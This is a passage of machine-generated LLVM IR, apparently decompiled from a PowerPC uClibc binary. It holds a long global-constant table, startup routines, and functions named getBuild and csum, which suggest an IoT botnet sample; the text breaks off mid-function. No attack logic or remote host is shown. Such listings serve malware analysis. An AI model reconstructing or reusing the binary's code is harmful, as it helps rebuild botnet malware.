@global_var_10013100.973 = constant i32 1207963277
@global_var_10013104.974 = constant i32 1207970217
@global_var_10013108.975 = constant i32 1207973753
@global_var_10013128.976 = constant i32 1207974021
@global_var_100131e8.977 = constant i32 939524096
@global_var_100138b0.978 = constant i32 1207982293
@global_var_10040d58.979 = local_unnamed_addr global [3 x i32] %wide-string
@global_var_10040d5c.980 = local_unnamed_addr global i32 64
@global_var_100451f4.981 = local_unnamed_addr global i32 0
@global_var_10045104.982 = local_unnamed_addr global i32 32
@global_var_10013e04.983 = constant [3 x i8] c"9 \00"
@global_var_10013e98.984 = constant i32 939524096
@global_var_100450e4.985 = local_unnamed_addr global i32 -1
@global_var_100450e0 = external local_unnamed_addr global i32
@global_var_100408e0 = external global i32
@global_var_10040ad4.986 = local_unnamed_addr global i32 0
@global_var_10013f64.987 = constant i32 939524096
@global_var_100451e0.988 = local_unnamed_addr global i32 0
@global_var_100451e4.989 = local_unnamed_addr global i32 0
@global_var_100451fc.990 = local_unnamed_addr global i32 0
@global_var_10045230.991 = global i32 0
@global_var_1004522c.992 = global i32 0
@global_var_10014050.993 = constant [3 x i8] c"8a\00"
@global_var_10045108.994 = local_unnamed_addr global i32 33
@global_var_1004510c.995 = local_unnamed_addr global i32 34
@global_var_100451dc.996 = local_unnamed_addr global i32 0
@global_var_10045148.998 = global i32* bitcast (i16* @global_var_10044d90.997 to i32*)
@global_var_1004514c.999 = local_unnamed_addr global i32 2
@global_var_10040924.1000 = local_unnamed_addr global i32* @global_var_1004522c.992
@global_var_100408f4.1001 = local_unnamed_addr global i32 0
@global_var_1004092c.1002 = local_unnamed_addr global i32* @global_var_10045230.991
@global_var_1001415c.1003 = constant i32 1207978825
@global_var_10014160.1004 = constant i32 1006632992
@global_var_100451f0.1005 = local_unnamed_addr global i32 0
@global_var_10045254.1006 = local_unnamed_addr global i32 0
@global_var_100142dc.1007 = constant i32 939589631
@global_var_1001431c.1008 = constant i32 1207959808
@global_var_100451f8.1009 = local_unnamed_addr global i32 0
@global_var_10040a7c.1010 = local_unnamed_addr global i32 0
@global_var_10045210.1011 = local_unnamed_addr global i32 0
@global_var_10040a80.1012 = local_unnamed_addr global i32 0
@global_var_10040ac0.1013 = global i32 0
@global_var_10040d70.1014 = global i32 0
@global_var_10040adc.1015 = local_unnamed_addr global i32* @global_var_10040d70.1014
@global_var_10040c6c.1016 = local_unnamed_addr global i32 0
@global_var_10040c68.1017 = local_unnamed_addr global i32 0
@global_var_10040ad0.1018 = local_unnamed_addr global i32 0
@global_var_10045218.1019 = local_unnamed_addr global i32 0
@global_var_1001441c.1020 = constant i32 939589631
@global_var_1004521c.1021 = local_unnamed_addr global i32 0
@global_var_1001447c.1022 = constant i32 939524101
@global_var_10040d80.1023 = global i32 0
@global_var_10014650.1024 = constant i32 1207959700
@global_var_100451e8.1025 = local_unnamed_addr global i32 0
@global_var_100451ec.1026 = local_unnamed_addr global i32 0
@global_var_10040d60.1027 = global i32 0
@global_var_10014784.1028 = constant [3 x i8] c"8`\00"
@global_var_10014848.1029 = constant [3 x i8] c"8`\00"
@global_var_100148a8.1030 = constant [3 x i8] c"8`\00"
@global_var_10014a0c.1031 = constant i32 1006632992
@global_var_10014ad4.1032 = constant [3 x i8] c"8`\00"
@global_var_10014b3c.1033 = constant [3 x i8] c"9 \00"
@global_var_10014bb8.1034 = constant [3 x i8] c"8`\00"
@global_var_10014c1c.1035 = constant [3 x i8] c"8`\00"
@global_var_10014c4c.1036 = constant i32 1207959648
@global_var_10014c98.1037 = constant i32 1207959572
@global_var_10014cac.1038 = constant [3 x i8] c"8`\00"
@global_var_10014d24.1039 = constant [3 x i8] c"8`\00"
@global_var_100150b0.1040 = constant i32 939524096
@global_var_100150c4.1041 = constant i32 1207959592
@global_var_100151f8.1042 = constant i32 1207959756
@global_var_100152e4.1043 = constant [3 x i8] c"8`\00"
@global_var_10015308.1044 = constant [3 x i8] c"8`\00"
@global_var_100153e8.1045 = constant i32 1207959692
@global_var_1001549c.1046 = constant [3 x i8] c"8`\00"
@global_var_10015654.1047 = constant i32 1207969745
@global_var_100156a4.1048 = constant i32 939524097
@global_var_10015728.1049 = constant [3 x i8] c"8`\00"
@global_var_10015730.1050 = constant [3 x i8] c"8`\00"
@global_var_100157a4.1051 = constant [3 x i8] c"8`\00"
@global_var_100157c0.1052 = constant [3 x i8] c"8`\00"
@global_var_100157e8.1053 = constant [3 x i8] c"8`\00"
@global_var_100159f0.1054 = constant [3 x i8] c"8`\00"
@global_var_10015a0c.1055 = constant [3 x i8] c"8`\00"
@global_var_10015a28.1056 = constant i32 1207959660
@global_var_10040ad8.1057 = local_unnamed_addr global i32 0
@global_var_10045200.1058 = local_unnamed_addr global i32 0
@global_var_10045204.1059 = local_unnamed_addr global i32 0
@global_var_10015de0.1060 = constant i32 939524096
@global_var_10045120.1061 = local_unnamed_addr global i32 2
@global_var_10015fbc.1063 = constant [3 x i8] c"8`\00"
@global_var_10040b08.1064 = global i32 0
@global_var_10040b10.1065 = global i32 0
@global_var_10040b0c.1066 = local_unnamed_addr global i32 0
@global_var_10040b04.1067 = local_unnamed_addr global i32* @global_var_10040b08.1064
@global_var_10016074.1068 = constant [3 x i8] c"8`\00"
@global_var_10016094.1069 = constant [3 x i8] c":!\00"
@global_var_100160f8.1070 = constant i32 1207960936
@global_var_1002e0b8.1071 = constant i32 -98132
@global_var_1004520c.1072 = local_unnamed_addr global i32 0
@global_var_10045208.1073 = local_unnamed_addr global i32 0
@global_var_100163b4.1074 = constant i32 1207959580
@global_var_10016530.1075 = constant i32 1023414276
@global_var_10016704.1077 = constant [3 x i8] c"9 \00"
@global_var_100496ec.1078 = global i32 0
@global_var_10049704.1079 = global i32 0
@global_var_10045220.1080 = local_unnamed_addr global i32 0
@global_var_10016960.1081 = constant [3 x i8] c"9 \00"
@global_var_10016a0c.1082 = constant i32 1207959676
@global_var_10016a40.1083 = constant i32 939524096
@global_var_10016a70.1084 = constant [3 x i8] c"8`\00"
@global_var_10016a88.1085 = constant [3 x i8] c"8`\00"
@global_var_10016b94.1086 = constant i32 2080375980
@global_var_10016c00.1087 = constant i32 939524096
@global_var_10016d78.1088 = constant [3 x i8] c"8`\00"
@global_var_10016db0.1089 = constant i32 939524096
@global_var_10017020.1090 = constant i32 939524134
@global_var_1001704c.1091 = constant i32 939524134
@global_var_10017078.1092 = constant i32 939524134
@global_var_100170b4.1093 = constant i32 939524112
@global_var_10017104.1094 = constant i32 939524107
@global_var_1001720c.1095 = constant i32 1207959792
@global_var_100173a8.1096 = constant i32 1207959912
@global_var_10017574.1097 = constant i32 939524130
@global_var_1001759c.1098 = constant i32 1207959704
@global_var_100175b4.1099 = constant i32 939524097
@global_var_100175c8.1100 = constant i32 1207959660
@global_var_100175ec.1101 = constant i32 939524107
@global_var_10049710.1102 = global i32 0
@global_var_10017874.1103 = constant [3 x i8] c"8`\00"
@global_var_10017a9c.1104 = constant i32 1207959700
@global_var_10017bac.1105 = constant [3 x i8] c"8`\00"
@global_var_10049814.1106 = global i32 0
@global_var_10017c3c.1107 = constant [3 x i8] c"9@\00"
@global_var_1004b814.1108 = global i32 0
@global_var_10017ca0.1109 = constant i32 939525121
@global_var_10017cd4.1111 = constant [3 x i8] c"8`\00"
@global_var_10017d04.1112 = constant [3 x i8] c"8`\00"
@global_var_10017d70.1113 = constant [3 x i8] c"8`\00"
@global_var_10017dd8.1114 = constant [3 x i8] c"8`\00"
@global_var_10017e8c.1115 = constant i32 956301313
@global_var_10017efc.1116 = constant i32 1207959584
@global_var_10017f14.1117 = constant i32 939524096
@global_var_10018024.1118 = constant i32 1207959572
@global_var_10018038.1119 = constant i32 939524097
@global_var_10045228.1120 = global i32 0
@global_var_10045224.1121 = local_unnamed_addr global i32 0
@global_var_100182b8.1122 = constant i32 2080375980
@global_var_10018350.1123 = constant i32 1207959732
@global_var_10018400.1124 = constant i32 2080375980
@global_var_100186b8.1125 = constant i32 1207959572
@global_var_100187a8.1126 = constant i32 1207959572
@global_var_100188a0.1127 = constant i32 1207959564
@global_var_10018a0c.1128 = constant i32 1207959812
@global_var_10018e70.1129 = constant i32 939589631
@global_var_10019560.1130 = constant i32 939524118
@global_var_10044d78.1134 = global i32 0
@global_var_10045238.1135 = local_unnamed_addr global i32 0
@global_var_10019834.1137 = constant i32 1207967309
@global_var_1002e3d2.1138 = constant i32 9587
@global_var_1002e3d0.1139 = constant [3 x i8] c": \00"
@global_var_1004513c = external local_unnamed_addr global i32
@global_var_1002e3d4.1140 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_1004b82c.1141 = global i32 0
@global_var_10045234.1142 = local_unnamed_addr global i32 0
@global_var_10019c88.1143 = constant i32 939524118
@global_var_10019d60.1144 = constant i32 939524096
@global_var_10019d84.1145 = constant [3 x i8] c"9`\00"
@global_var_10019df4.1146 = constant i32 1207959864
@global_var_10019e1c.1148 = constant i32 1207987433
@global_var_1002e3dc.1149 = constant [8 x i8] c"/bin/sh\00"
@global_var_1002e3e4.1150 = constant [3 x i8] c"sh\00"
@global_var_1002e3e8.1151 = constant [3 x i8] c"-c\00"
@global_var_10019ea4.1152 = constant [3 x i8] c"8`\00"
@global_var_10019f20.1153 = constant i32 1207959580
@global_var_10019f34.1154 = constant i32 939524096
@global_var_10019fbc.1155 = constant i32 1207960120
@global_var_10044d60.1156 = global i32 0
@global_var_1001a1f0.1157 = constant i32 1207959560
@global_var_1001a240.1158 = constant [3 x i8] c" c\00"
@global_var_1001a25c.1159 = constant [3 x i8] c" c\00"
@global_var_1002e3f0.1160 = constant i32 0
@global_var_1001a5a8.1161 = constant i32 1207961092
@global_var_1001a6d4.1162 = constant i32 1207960768
@global_var_1002e424.1163 = constant i32 269488136
@global_var_1002e408.1164 = constant [6 x i8] c"(nil)\00"
@global_var_1002e410.1165 = constant [7 x i8] c"(null)\00"
@global_var_1002e418.1166 = constant i32 721431808
@global_var_1001ab30.1167 = constant i32 939524096
@global_var_1002e4a4.1168 = constant i32 65793
@global_var_1002e48c.1169 = constant i32 524293
@global_var_1004515c = external local_unnamed_addr global i32
@global_var_1002f75e.1171 = constant i32 1
@global_var_1002e484.1172 = constant [8 x i8] c" +0-#'I\00"
@global_var_1002e42c.1173 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1002e46c.1174 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1002e460.1175 = constant i32 67343
@global_var_1002e45f.1176 = constant i32 50331911
@global_var_1002e450.1177 = constant i32 268435461
@global_var_1002e440.1178 = constant i32 520093701
@global_var_1001b4ec.1179 = constant [3 x i8] c"8a\00"
@global_var_1001b854.1180 = constant i32 1207959708
@global_var_1001b8fc.1181 = constant i32 1207959612
@global_var_1001bb6c.1182 = constant i32 939589631
@global_var_1001bc20.1183 = constant i32 939524118
@global_var_1002e4c0.1184 = constant [8 x i8] c"Success\00"
@global_var_1002e4b0.1185 = constant [15 x i8] c"Unknown error \00"
@global_var_10045164.1186 = local_unnamed_addr global i32* @global_var_1002f75e.1171
@global_var_10045240.1187 = global i32 0
@global_var_1002f034.1189 = constant i32 0
@global_var_1001cf70.1190 = constant [3 x i8] c"9 \00"
@global_var_1002f094.1191 = constant i32 0
@global_var_1001d384.1192 = constant i32 1207959560
@global_var_1001d3e0.1193 = constant [3 x i8] c"9 \00"
@global_var_1002f01c.1194 = constant i32 10
@global_var_1001d624.1195 = constant [3 x i8] c"9 \00"
@global_var_1001d804.1196 = constant [3 x i8] c"8`\00"
@global_var_1002f06c.1197 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1001d9fc.1198 = constant [3 x i8] c"9 \00"
@global_var_1001da08.1199 = constant i32 939524193
@global_var_1001da70.1201 = constant i32 939524101
@global_var_1001db5c.1202 = constant i32 939524124
@global_var_1001dbd4.1203 = constant i32 1207960116
@global_var_1001dbec.1204 = constant i32 939524105
@global_var_1001dd64.1205 = constant [3 x i8] c"9 \00"
@global_var_1002f080.1206 = constant [3 x i8] c"%x\00"
@global_var_1001ddf0.1207 = constant i32 939524124
@global_var_1001de14.1208 = constant i32 939524193
@global_var_1004d844.1209 = global i32 0
@global_var_1004da20.1210 = global i32 0
@global_var_1004d854.1211 = global i32 0
@global_var_10045088.1212 = global i32 0
@global_var_1004528c.1213 = local_unnamed_addr global i32 0
@global_var_1004ef04.1214 = global i32 0
@global_var_1001e22c.1215 = constant [3 x i8] c"8`\00"
@global_var_1001e310.1216 = constant i32 939524098
@global_var_1001e350.1217 = constant [3 x i8] c"8`\00"
@global_var_1001e3bc.1218 = constant i32 1207960188
@global_var_1001e5e4.1219 = constant i32 939524106
@global_var_1001e604.1220 = constant [3 x i8] c"8`\00"
@global_var_1001e61c.1221 = constant i32 1207959564
@global_var_1002f0a4.1222 = constant [25 x i8] c"%u.%u.%u.%u.in-addr.arpa\00"
@global_var_1001e7ac.1223 = constant i32 1207959648
@global_var_1002f0c0.1224 = constant [7 x i8] c"%x.%x.\00"
@global_var_1002f0c8.1225 = constant [9 x i8] c"ip6.arpa\00"
@global_var_1001e80c.1226 = constant i32 939524096
@global_var_1001e940.1227 = constant [3 x i8] c"8`\00"
@global_var_1001ed38.1228 = constant i32 939524118
@global_var_1001ed84.1229 = constant i32 939524118
@global_var_1001ee28.1230 = constant i32 939524118
@global_var_1001ee80.1231 = constant i32 939524097
@global_var_1001eedc.1232 = constant i32 939524118
@global_var_1004edc0.1233 = global i32 0
@global_var_10045150 = external global i32
@global_var_1001f138.1236 = constant i32 939524108
@global_var_1001f18c.1237 = constant i32 939524108
@global_var_1001f240.1238 = constant [3 x i8] c"8`\00"
@global_var_1001f448.1239 = constant i32 1207959640
@global_var_1001f484.1240 = constant i32 1207959580
@global_var_10044f88.1241 = global i32 0
@global_var_10044fa0 = external global i32
@global_var_10044fc0.1243 = global i32 -1726662223
@global_var_10044fa8.1244 = local_unnamed_addr global i32* @global_var_10044fc0.1243
@global_var_10044fa4.1245 = global i32* @global_var_10044fc0.1243
@global_var_1002f0d4.1246 = constant i32 0
@global_var_1001f79c.1247 = constant i32 939524118
@global_var_1001faf0.1248 = constant [3 x i8] c"8`\00"
@global_var_1001fd0c.1249 = constant i32 939524130
@global_var_1004503c.1250 = global i32 0
@global_var_10045244.1251 = local_unnamed_addr global i32 0
@global_var_1001fda0.1252 = constant i32 1207960933
@global_var_1001fddc.1253 = constant i32 939589631
@global_var_10045250.1254 = local_unnamed_addr global i32 0
@global_var_1002f0fc.1255 = constant i32 -61332
@global_var_10020158.1256 = constant i32 939524118
@global_var_10045248.1257 = global i32 0
@global_var_100400b8.1258 = global i32 -1
@global_var_10045258.1259 = local_unnamed_addr global i32 0
@global_var_1004525c.1260 = local_unnamed_addr global i32 0
@global_var_1002f354.1261 = constant [10 x i8] c"/dev/null\00"
@global_var_10045260.1262 = local_unnamed_addr global i32 0
@global_var_1004524c.1263 = local_unnamed_addr global i32 0
@global_var_100206b0.1264 = constant i32 939524096
@global_var_100206cc.1265 = constant i32 939524096
@global_var_1004da4c.1266 = global i32 0
@global_var_1002071c.1267 = constant i32 1207959564
@global_var_10045268.1268 = local_unnamed_addr global i32 0
@global_var_10020760.1269 = constant i32 1207959564
@global_var_10045264.1270 = global i32 0
@global_var_1002079c.1271 = constant i32 1207959580
@global_var_100207b0.1272 = constant i32 939524097
@global_var_100207d0.1273 = constant i32 1207959564
@global_var_10020818.1274 = constant i32 1207959608
@global_var_10020840.1275 = constant i32 1207959564
@global_var_10045270.1276 = global i32 0
@global_var_10045274.1277 = global i32 0
@global_var_1004eee4.1278 = global i32 0
@global_var_1004ee58.1279 = global i32 0
@global_var_100209a8.1280 = constant i32 1207965321
@global_var_10020a00.1281 = constant i32 1207959564
@global_var_100452ac.1282 = local_unnamed_addr global i32 0
@global_var_10020e98.1283 = constant i32 939524180
@global_var_10021218.1284 = constant i32 939524105
@global_var_1002f988.1285 = constant [4 x i8] c"inf\00"
@global_var_1002f98b.1287 = constant i32 4804166
@global_var_1002f998.1288 = constant i32 771763200
@global_var_10022104.1289 = constant i32 939589631
@global_var_10022164.1290 = constant i32 939589631
@global_var_10022220.1291 = constant i32 939524098
@global_var_1002f9e8.1292 = constant i32 -54848
@global_var_1002fa24.1293 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_10022510.1294 = constant i32 939524108
@global_var_10045054.1295 = global i32 268576644
@global_var_10022630.1296 = constant i32 939524108
@global_var_100227f0.1297 = constant i32 939524099
@global_var_1004eed8.1298 = global i32 0
@global_var_10022ce4.1299 = constant i32 1207959608
@global_var_1004db18.1300 = global i32 0
@global_var_1004526c.1301 = local_unnamed_addr global i32 0
@global_var_1004db30.1302 = global i32 0
@global_var_10022da4.1303 = constant i32 939524097
@global_var_10022eec.1308 = constant i32 1207959576
@global_var_10022f18.1309 = constant i32 939524096
@global_var_1002fa54.1310 = constant i32 -51744
@global_var_1002fa6c.1311 = constant i32 0
@global_var_100237a4.1312 = constant i32 1207959704
@global_var_10023818.1313 = constant i32 1207959588
@global_var_10023830.1314 = constant i32 1207959564
@global_var_1002386c.1315 = constant i32 1207959564
@global_var_10023be4.1316 = constant i32 1207959560
@global_var_1002fa84.1317 = constant i32 268582360
@global_var_1002fa90.1318 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_10023f24.1319 = constant i32 1207959664
@global_var_10023f50.1320 = constant i32 1207959620
@global_var_100240c0.1321 = constant i32 1207959600
@global_var_1002417c.1322 = constant i32 1207959560
@global_var_10024218.1323 = constant [3 x i8] c"|c\00"
@global_var_1002426c.1324 = constant i32 956301313
@global_var_10024318.1325 = constant [3 x i8] c"|c\00"
@global_var_1002436c.1326 = constant i32 939524097
@global_var_10024404.1327 = constant i32 1207959600
@global_var_10024544.1328 = constant i32 1207959608
@global_var_10045278.1329 = global i32 0
@global_var_1002faec.1330 = constant i32 0
@global_var_10024664.1331 = constant i32 1207959568
@global_var_10024710.1332 = constant i32 1207959560
@global_var_1002fab4.1333 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_100247f4.1334 = constant i32 1207959620
@global_var_10024814.1335 = constant i32 1207959592
@global_var_10024820.1336 = constant i32 939524096
@global_var_1002fad0.1337 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_10024928.1338 = constant i32 1207959620
@global_var_1002495c.1339 = constant i32 939524096
@global_var_1002faf0.1340 = constant i32 268585408
@global_var_1004527c.1341 = local_unnamed_addr global i32 0
@global_var_1004506c.1342 = global i32 0
@global_var_10045280.1343 = local_unnamed_addr global i32 0
@global_var_1002fb18.1344 = constant [14 x i8] c"/etc/services\00"
@global_var_1002fb28.1345 = constant i32 1912602624
@global_var_1002fb2c.1346 = constant [3 x i8] c"#\0A\00"
@global_var_1002fb30.1347 = constant [3 x i8] c" \09\00"
@global_var_1002fb34.1348 = constant [3 x i8] c",/\00"
@global_var_1004db48.1349 = global i32 0
@global_var_10024efc.1350 = constant i32 939524096
@global_var_10045284.1351 = local_unnamed_addr global i32 0
@global_var_10025028.1352 = constant i32 1207959588
@global_var_10025084.1353 = constant [3 x i8] c"8a\00"
@global_var_10025164.1354 = constant i32 1207959652
@global_var_100251f8.1355 = constant [3 x i8] c"8a\00"
@global_var_1002549c.1356 = constant i32 939524201
@global_var_100254b4.1357 = constant i32 1207959776
@global_var_1004db58.1359 = global i32 0
@global_var_10045288.1360 = local_unnamed_addr global i32 0
@global_var_100257d8.1362 = constant i32 1207960848
@global_var_10045290.1363 = local_unnamed_addr global i32 0
@global_var_1002fb38.1364 = constant i32 771751936
@global_var_1004eef4.1365 = global i32 0
@global_var_100258c8.1366 = constant [3 x i8] c"8a\00"
@global_var_100258d4.1367 = constant i32 939524097
@global_var_100259a8.1368 = constant i32 939524097
@global_var_10025a7c.1369 = constant i32 939524097
@global_var_10025aa8.1370 = constant i32 939524100
@global_var_10025b88.1371 = constant i32 1207959684
@global_var_10025d04.1372 = constant i32 939589631
@global_var_1002fb40.1373 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1002fb54.1374 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1002fb6c.1375 = constant [11 x i8] c"nameserver\00"
@global_var_1002fb78.1376 = constant [7 x i8] c"domain\00"
@global_var_1002fb80.1377 = constant [7 x i8] c"search\00"
@global_var_1002603c.1378 = constant i32 1207959568
@global_var_10026044.1379 = constant i32 939524099
@global_var_10026154.1380 = constant i32 1207959560
@global_var_100261ec.1381 = constant [3 x i8] c"8`\00"
@global_var_100450a0.1382 = global i32 0
@global_var_100263b4.1383 = constant i32 939524129
@global_var_10045294.1384 = local_unnamed_addr global i32 0
@global_var_10026428.1385 = constant [3 x i8] c"8`\00"
@global_var_10026460.1386 = constant i32 939524129
@global_var_1004529c.1387 = local_unnamed_addr global i32 0
@global_var_10045298.1388 = local_unnamed_addr global i32 0
@global_var_100265e4.1389 = constant i32 1207959580
@global_var_100452a0.1390 = local_unnamed_addr global i32 0
@global_var_100266a8.1391 = constant i32 939524108
@global_var_100452a4.1392 = local_unnamed_addr global i32 0
@global_var_100452a8.1393 = local_unnamed_addr global i32 0
@global_var_10026838.1394 = constant [3 x i8] c"8a\00"
@global_var_10026b5c.1395 = constant i32 939524171
@global_var_10026c0c.1396 = constant i32 939524105
@global_var_1002fb88.1397 = constant i32 268595876
@global_var_10027468.1398 = constant i32 1023414274
@global_var_100274e4.1399 = constant i32 939524098
@global_var_10027500.1400 = constant i32 939524192
@global_var_10027524.1402 = constant i32 939524520
@global_var_100452b1.1403 = global i32 0
@global_var_1002fb9c.1404 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_1002fbb4.1405 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_10027640.1406 = constant [3 x i8] c"8`\00"
@global_var_1002fbec.1407 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_100276d0.1408 = constant [3 x i8] c"8`\00"
@global_var_10027700.1409 = constant [3 x i8] c"8`\00"
@global_var_10027858.1414 = constant [3 x i8] c";A\00"
@global_var_1002fc04.1415 = constant [24 x i8] c"Cannot register service\00"
@global_var_10027918.1416 = constant i32 939524096
@global_var_100452b4.1417 = local_unnamed_addr global i32 0
@global_var_1002fc2c.1418 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_10027ac4.1419 = constant i32 1207959664
@global_var_10027b28.1420 = constant i32 939524096
@global_var_1002fc48.1421 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1002fc54.1422 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10028220.1423 = constant i32 1207959560
@global_var_1002fe60.1424 = constant i32 0
@global_var_1002fef0.1425 = constant [13 x i8] c"RPC: Success\00"
@global_var_1002fc68.1426 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_1002fc84.1427 = constant [5 x i8] c"%s: \00"
@global_var_1002fc8c.1428 = constant [4 x i8] c" - \00"
@global_var_100284b4.1429 = constant i32 1207959608
@global_var_1002fd10.1430 = constant i32 -30228
@global_var_1002fc90.1431 = constant [13 x i8] c"; errno = %s\00"
@global_var_10028618.1432 = constant i32 1207959776
@global_var_1002fcf8.1439 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_100400c0.1440 = global i32 0
@global_var_100400bc.1441 = global i32 268517568
@global_var_100452b8.11 = local_unnamed_addr global i8 0
@global_var_10045170.23 = local_unnamed_addr global i8 0
@global_var_10045174.29 = external local_unnamed_addr global i8*
@global_var_1002a5d8.104 = external local_unnamed_addr constant i8*
@global_var_1002a024.495 = external constant [10 x i8*]
@global_var_10045177.927 = external local_unnamed_addr global i8*
@global_var_10045176.928 = external local_unnamed_addr global i8*
@global_var_10045175.929 = external global i8*
@global_var_1004db74.947 = external local_unnamed_addr global i8*
@global_var_1004db78.948 = external local_unnamed_addr global i8*
@global_var_1004db7c.949 = external local_unnamed_addr global i8*
@global_var_1004db80.951 = external local_unnamed_addr global i8*
@global_var_10044d90.997 = global i16 288
@global_var_1004523c.1136 = local_unnamed_addr global i16* null
@global_var_10044de0.1132 = local_unnamed_addr global i16 272
@2 = internal constant [3 x i8] c"\01\06\00"
@global_var_1002f03b.1188 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_10045084.1361 = local_unnamed_addr global i16 1
@global_var_100452b0.1401 = local_unnamed_addr global i16 0
@global_var_1002a6f0.111 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_100452b8.11, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_100400e4.13 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_100400e4.13 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_100400e4.13 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_100452b8.11, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_100452b8.11, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_100400cc.18, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_100400cc.18 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 10084), i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32 -30508), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1002a064.21 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100002b45 = icmp sgt i32 %arg2, 1
  br i1 %v2_100002b45, label %dec_label_pc_10000280, label %dec_label_pc_100002bc

dec_label_pc_10000280:                            ; preds = %entry, %dec_label_pc_10000280
  %stack_var_-24.09 = phi i16* [ %v5_100002a0, %dec_label_pc_10000280 ], [ %arg1, %entry ]
  %stack_var_-20.08 = phi i32 [ %v1_100002a8, %dec_label_pc_10000280 ], [ %arg2, %entry ]
  %stack_var_-16.07 = phi i32 [ %v2_10000290, %dec_label_pc_10000280 ], [ 0, %entry ]
  %v4_10000280 = ptrtoint i16* %stack_var_-24.09 to i32
  %v2_10000284 = load i16, i16* %stack_var_-24.09, align 2
  %v3_10000284 = zext i16 %v2_10000284 to i32
  %v2_10000290 = add i32 %v3_10000284, %stack_var_-16.07
